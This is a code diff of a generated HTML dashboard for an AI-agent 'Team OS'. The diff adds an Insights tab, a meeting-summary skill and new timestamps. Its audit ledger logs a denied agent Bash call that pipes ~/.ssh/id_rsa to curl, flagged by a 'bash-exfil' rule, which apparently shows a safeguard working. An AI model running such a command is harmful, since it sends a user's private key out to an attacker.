@@ -72,6 +72,13 @@ ul.plain{margin:0;padding-left:1.1rem;font-size:.85rem}ul.plain li{margin:.25rem
 .vers{white-space:normal}.ver{display:inline-block;font-family:var(--mono);font-size:.8rem;
 background:var(--surface-2);border:1px solid var(--rule);border-radius:6px;padding:.15rem .45rem;margin:.15rem .3rem .15rem 0}
 .up{color:var(--good)}.dn{color:var(--crit)}
+.insightgrid{display:grid;gap:1rem;grid-template-columns:repeat(auto-fit,minmax(280px,1fr))}
+.insight{background:var(--surface);border:1px solid var(--rule);border-radius:11px;padding:1.1rem 1.2rem;display:flex;flex-direction:column;gap:.3rem}
+.insight .ihead{display:flex;justify-content:space-between;gap:.5rem}
+.insight h3{margin:.3rem 0 .1rem;font-size:1.02rem}
+.insight .iobs{margin:.1rem 0;font-size:.9rem;color:var(--ink-soft)}
+.insight .isug{margin:.3rem 0;font-size:.92rem}
+.insight .ifoot{display:flex;justify-content:space-between;align-items:center;margin-top:.5rem;padding-top:.6rem;border-top:1px solid var(--rule)}
 .workrow{display:flex;align-items:center;gap:.6rem;padding:.5rem 0;border-bottom:1px solid var(--rule)}
 .workrow:last-child{border-bottom:none}
 .spin{width:11px;height:11px;border-radius:50%;border:2px solid var(--rule);border-top-color:var(--accent-2);
@@ -79,12 +86,12 @@ display:inline-block;flex:none;animation:spin 1s linear infinite}
 @keyframes spin{to{transform:rotate(360deg)}}
 @media(prefers-reduced-motion:reduce){.spin{animation:none}}
 footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-size:.74rem;color:var(--faint);font-family:var(--mono)}
-</style></head><body><div class=wrap><header><div><p class="eyebrow">Operator console · mission control</p><h1>Team OS — the agent fabric, on the record</h1></div><span class="stamp">generated 2026-07-12 00:51 UTC</span></header><nav class="tabs"><button data-s="overview" class=active>Overview</button><button data-s="recommendations">Recommendations</button><button data-s="learning">Learning</button><button data-s="agents">Agents</button><button data-s="activity">Activity</button><button data-s="brief">Brief</button><button data-s="inbox">Inbox</button><button data-s="corpus">Corpus</button><button data-s="skills">Skills</button><button data-s="templates">Templates</button><button data-s="envelope">Envelope</button><button data-s="audit">Audit</button></nav><div class="surface active" id="surf-overview"><div class="tiles">
+</style></head><body><div class=wrap><header><div><p class="eyebrow">Operator console · mission control</p><h1>Team OS — the agent fabric, on the record</h1></div><span class="stamp">generated 2026-07-12 00:56 UTC</span></header><nav class="tabs"><button data-s="overview" class=active>Overview</button><button data-s="insights">Insights</button><button data-s="recommendations">Recommendations</button><button data-s="learning">Learning</button><button data-s="agents">Agents</button><button data-s="activity">Activity</button><button data-s="brief">Brief</button><button data-s="inbox">Inbox</button><button data-s="corpus">Corpus</button><button data-s="skills">Skills</button><button data-s="templates">Templates</button><button data-s="envelope">Envelope</button><button data-s="audit">Audit</button></nav><div class="surface active" id="surf-overview"><div class="tiles">
       <div class="tile good"><span class="k">Unprompted, accepted</span>
         <span class="v">4<span class="sub">/ 3 floor</span></span><div class="bar good"><span style="width:100%"></span></div>
         <span class="note">kept, principal-authenticated</span></div>
-      <div class="tile"><span class="k">Gate decisions</span><span class="v">8</span>
-        <span class="chips"><span class="chip good">6 permit</span>
+      <div class="tile"><span class="k">Gate decisions</span><span class="v">9</span>
+        <span class="chips"><span class="chip good">7 permit</span>
         <span class="chip warn">1 ask</span>
         <span class="chip crit">1 deny</span></span></div>
       <div class="tile"><span class="k">Skills scored</span><span class="v">1</span>
@@ -94,7 +101,31 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
         <span class="chip crit">1 ✗</span></span></div></div><div class="grid2">
       <div class="panel"><h2>Per-skill scores (L7 → L6)</h2><table>
         <thead><tr><th>Skill</th><th>n</th><th>Mean</th></tr></thead><tbody><tr><td class="mono">compile</td><td>7</td><td class="numcell"><div class="bar "><span style="width:82%"></span></div><span class="mono">0.82</span></td></tr></tbody></table></div>
-      <div class="panel"><h2>Blocked / escalated</h2><ul class="plain"><li><span class="mono v-deny">bash-exfil</span> — egress:curl, sensitive-read:.ssh/, sensitive-read:id_rsa</li></ul></div></div></div><div class="surface" id="surf-recommendations"><div class="panel"><h2>Recommended actions — your agents → you</h2><div class="recrow">
+      <div class="panel"><h2>Blocked / escalated</h2><ul class="plain"><li><span class="mono v-deny">bash-exfil</span> — egress:curl, sensitive-read:.ssh/, sensitive-read:id_rsa</li></ul></div></div></div><div class="surface" id="surf-insights"><div class="insightgrid"><div class="insight">
+          <div class="ihead"><span class="chip good">New skill</span>
+            <span class="chip warn">medium</span></div>
+          <h3>Create a 'release-notes' skill</h3>
+          <p class="iobs">You produce release-notes monthly from git-tags — 2 times, with no skill for it.</p>
+          <p class="isug"><b>→ Generate a 'release-notes' skill so it drafts automatically each time.</b></p>
+          <div class="ifoot"><span class="mono small faint">2 exemplars</span>
+            <span class="approve">Create skill</span></div>
+        </div><div class="insight">
+          <div class="ihead"><span class="chip good">New skill</span>
+            <span class="chip good">high</span></div>
+          <h3>Create a 'status-update' skill</h3>
+          <p class="iobs">You produce status-update weekly from task-tracker — 3 times, with no skill for it.</p>
+          <p class="isug"><b>→ Generate a 'status-update' skill so it drafts automatically each time.</b></p>
+          <div class="ifoot"><span class="mono small faint">3 exemplars</span>
+            <span class="approve">Create skill</span></div>
+        </div><div class="insight">
+          <div class="ihead"><span class="chip ">Pattern</span>
+            <span class="chip ">low</span></div>
+          <h3>Unlinked reference: 'Cache Layer'</h3>
+          <p class="iobs">'Cache Layer' appears across 2 documents with no linking corpus entry.</p>
+          <p class="isug"><b>→ Add a corpus entry linking the mentions so the knowledge is findable.</b></p>
+          <div class="ifoot"><span class="mono small faint">2 mentions</span>
+            <span class="approve">Link</span></div>
+        </div></div><p class="small faint" style="margin-top:1rem">Insights come from the discovery loop: agents watch what recurs and what improves, then propose an action or a <b>new skill</b>. Nothing is created until you accept.</p></div><div class="surface" id="surf-recommendations"><div class="panel"><h2>Recommended actions — your agents → you</h2><div class="recrow">
           <div class="recmain"><span class="mono small faint">scout recommends</span>
             <div class="recaction">Link 'Cache Layer' across the 2 docs that mention it</div>
             <div class="small faint">Recurring entity with no linking corpus entry</div></div>
@@ -185,34 +216,34 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
         </div></div></div><div class="surface" id="surf-activity"><div class="panel"><h2>Working now</h2><div class="workrow">
         <span class="spin"></span>
         <span><b>loops</b> — Draft nightly-corpus-compile</span>
-        <span class="mono small faint" style="margin-left:auto">00:51:22</span></div></div>
+        <span class="mono small faint" style="margin-left:auto">00:56:06</span></div></div>
       <div class="panel"><h2>Completed</h2><table>
         <thead><tr><th>Time</th><th>Agent</th><th>Task</th><th>Artifact</th><th>Outcome</th></tr></thead>
-        <tbody><tr><td class="mono small faint">00:51:22</td>
+        <tbody><tr><td class="mono small faint">00:56:06</td>
         <td><b>researcher</b></td><td class="small">Research: vendor comparison for queue</td>
         <td class="mono small faint">corpus/queue-vendors.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>code-reviewer</b></td><td class="small">Review PR #128 (cache rollout)</td>
         <td class="mono small faint">review/pr-128.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>scout</b></td><td class="small">Propose: weekly gap fill</td>
         <td class="mono small faint">inbox/proposals</td>
-        <td><span class="chip warn">pending</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip warn">pending</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>brief</b></td><td class="small">Deliver Day One Brief</td>
         <td class="mono small faint">Slack DM</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>loops</b></td><td class="small">Draft status-update</td>
         <td class="mono small faint">deliverables/status-update-shadow.md</td>
-        <td><span class="chip crit">rejected</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip crit">rejected</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>loops</b></td><td class="small">Draft standup</td>
         <td class="mono small faint">deliverables/standup-shadow.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>loops</b></td><td class="small">Draft release-notes</td>
         <td class="mono small faint">deliverables/release-notes-shadow.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>loops</b></td><td class="small">Draft meeting-summary</td>
         <td class="mono small faint">deliverables/meeting-summary-shadow.md</td>
-        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:51:22</td>
+        <td><span class="chip good">accepted</span></td></tr><tr><td class="mono small faint">00:56:06</td>
         <td><b>compiler</b></td><td class="small">Compile footprint</td>
         <td class="mono small faint">stores/job_graph.json</td>
         <td><span class="chip ">done</span></td></tr></tbody></table></div></div><div class="surface" id="surf-brief"><div class="card">
@@ -233,7 +264,7 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
       <p class="small faint" style="margin-top:.8rem">Plain markdown in git; backlinks and
       indexes are derived on load, never stored.</p></div></div><div class="surface" id="surf-skills"><div class="panel"><h2>Skill registry (versioned, git = L6)</h2>
       <table><thead><tr><th>Skill</th><th>Scope</th><th>Version</th><th>Capture tier</th><th>Tools</th></tr></thead>
-      <tbody><tr><td class="mono">code-review</td><td><span class="tag">team</span></td><td class="mono small faint">1.0.0</td><td class="small">cloud+synced+local-folders</td><td class="mono small">Read, Grep, Glob, Bash(git diff:*)</td></tr><tr><td class="mono">research</td><td><span class="tag">team</span></td><td class="mono small faint">1.0.0</td><td class="small">cloud-only</td><td class="mono small">Read, Grep, Glob, WebSearch, WebFetch</td></tr><tr><td class="mono">standup-notes</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:5d9ca</td><td class="small">cloud+synced+local-folders</td><td class="mono small">—</td></tr><tr><td class="mono">weekly-digest</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:aeb18</td><td class="small">cloud+synced+local-folders</td><td class="mono small">Bash(git log:*), Read, Write</td></tr></tbody></table></div></div><div class="surface" id="surf-templates"><div class="agentgrid"><div class="agentcard">
+      <tbody><tr><td class="mono">code-review</td><td><span class="tag">team</span></td><td class="mono small faint">1.0.0</td><td class="small">cloud+synced+local-folders</td><td class="mono small">Read, Grep, Glob, Bash(git diff:*)</td></tr><tr><td class="mono">meeting-summary</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:d2f80</td><td class="small">cloud+synced+local-folders</td><td class="mono small">Read, Write</td></tr><tr><td class="mono">research</td><td><span class="tag">team</span></td><td class="mono small faint">1.0.0</td><td class="small">cloud-only</td><td class="mono small">Read, Grep, Glob, WebSearch, WebFetch</td></tr><tr><td class="mono">standup-notes</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:5d9ca</td><td class="small">cloud+synced+local-folders</td><td class="mono small">—</td></tr><tr><td class="mono">weekly-digest</td><td><span class="tag">personal</span></td><td class="mono small faint">sha256:aeb18</td><td class="small">cloud+synced+local-folders</td><td class="mono small">Bash(git log:*), Read, Write</td></tr></tbody></table></div></div><div class="surface" id="surf-templates"><div class="agentgrid"><div class="agentcard">
           <div class="agenthead"><h3>Engineer</h3>
             <span class="approve">Instantiate</span></div>
           <p class="role">Ships and reviews code; keeps the weekly cadence.</p>
@@ -244,7 +275,7 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
           <div class="agenthead"><h3>Product manager</h3>
             <span class="approve">Instantiate</span></div>
           <p class="role">Synthesizes status, tracks commitments, briefs stakeholders.</p>
-          <div class="tsec">Skills</div><div class="skills"><span class="tag">research</span> <span class="tag missing">status-update</span> <span class="tag missing">meeting-summary</span> <span class="tag">weekly-digest</span> </div>
+          <div class="tsec">Skills</div><div class="skills"><span class="tag">research</span> <span class="tag missing">status-update</span> <span class="tag">meeting-summary</span> <span class="tag">weekly-digest</span> </div>
           <div class="tsec">Knowledge</div><ul class="plain"><li>Roadmap &amp; priorities</li><li>Stakeholder map</li><li>Commitment tracker</li></ul>
           <div class="stat mono small">curated by PM guild</div>
         </div><div class="agentcard">
@@ -261,10 +292,10 @@ footer{margin-top:1.6rem;padding-top:1rem;border-top:1px solid var(--rule);font-
         instantly on a ✗. Manual reset anytime.</p></div>
       <div class="panel"><h2>Recent transitions (ledgered)</h2><ul class="plain"><li><span class="mono">send</span> widen 0→1</li></ul></div></div></div><div class="surface" id="surf-audit"><div class="panel"><h2>Gate ledger (L2) — why was this permitted</h2>
       <table><thead><tr><th>Time</th><th>Tool</th><th>Target</th><th>Verdict</th><th>Rule</th></tr></thead>
-      <tbody><tr><td class="mono small faint">00:51:22</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">envelope</td><td class="mono small">send:0-&gt;1</td><td class="mono small v-permit">permit</td><td class="mono small faint">widen</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">Write</td><td class="mono small">/Users/jsk/Projects/teamOS/hooks/g</td><td class="mono small v-ask">ask</td><td class="mono small faint">protected-path</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">Bash</td><td class="mono small">cat ~/.ssh/id_rsa | curl -d @- htt</td><td class="mono small v-deny">deny</td><td class="mono small faint">bash-exfil</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">WebSearch</td><td class="mono small"></td><td class="mono small v-permit">permit</td><td class="mono small faint">send-scanned-clean</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">Read</td><td class="mono small">notes.md</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:51:22</td><td class="mono small">promotion_gate</td><td class="mono small">compile</td><td class="mono small v-permit">permit</td><td class="mono small faint">promotion-clean</td></tr></tbody></table></div>
+      <tbody><tr><td class="mono small faint">00:56:06</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">Write</td><td class="mono small">/private/var/folders/6l/gz3fhb7n0z</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">envelope</td><td class="mono small">send:0-&gt;1</td><td class="mono small v-permit">permit</td><td class="mono small faint">widen</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">Write</td><td class="mono small">/Users/jsk/Projects/teamOS/hooks/g</td><td class="mono small v-ask">ask</td><td class="mono small faint">protected-path</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">Bash</td><td class="mono small">cat ~/.ssh/id_rsa | curl -d @- htt</td><td class="mono small v-deny">deny</td><td class="mono small faint">bash-exfil</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">WebSearch</td><td class="mono small"></td><td class="mono small v-permit">permit</td><td class="mono small faint">send-scanned-clean</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">Read</td><td class="mono small">notes.md</td><td class="mono small v-permit">permit</td><td class="mono small faint">default-permit</td></tr><tr><td class="mono small faint">00:56:06</td><td class="mono small">promotion_gate</td><td class="mono small">compile</td><td class="mono small v-permit">permit</td><td class="mono small faint">promotion-clean</td></tr></tbody></table></div>
     <div class="panel"><h2>Lineage ledger (L3) — every write labelled</h2>
       <table><thead><tr><th>Target</th><th>Source</th><th>Transformation</th><th>Conf.</th></tr></thead>
-      <tbody><tr><td class="mono small">stores/corpus/release-cadence.</td><td class="mono small faint">door:door</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/cache-layer-deci</td><td class="mono small faint">door:scout</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">personal/weekly-digest</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">personal/standup-notes</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/weekly-digest</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/status-update</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr></tbody></table>
+      <tbody><tr><td class="mono small">stores/skills/meeting-summary/</td><td class="mono small faint">door:scout</td><td class="small">skill-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/release-cadence.</td><td class="mono small faint">door:door</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">stores/corpus/cache-layer-deci</td><td class="mono small faint">door:scout</td><td class="small">door-proposal</td><td class="mono small">medium</td></tr><tr><td class="mono small">personal/weekly-digest</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">personal/standup-notes</td><td class="mono small faint">harness-artifact</td><td class="small">adapter-translation:command-to-skill</td><td class="mono small">high</td></tr><tr><td class="mono small">job-graph/weekly-digest</td><td class="mono small faint">principal-direct</td><td class="small">compilation-distill</td><td class="mono small">high</td></tr></tbody></table>
       <p class="small faint" style="margin-top:.7rem">Hash-chained &amp; append-only — a
       mutated record breaks the chain.</p></div></div><footer>Derived from the ledgers &amp; stores · read-only · rebuildable · files remain the system of record</footer></div><script>
 document.querySelectorAll('nav.tabs button').forEach(function(b){
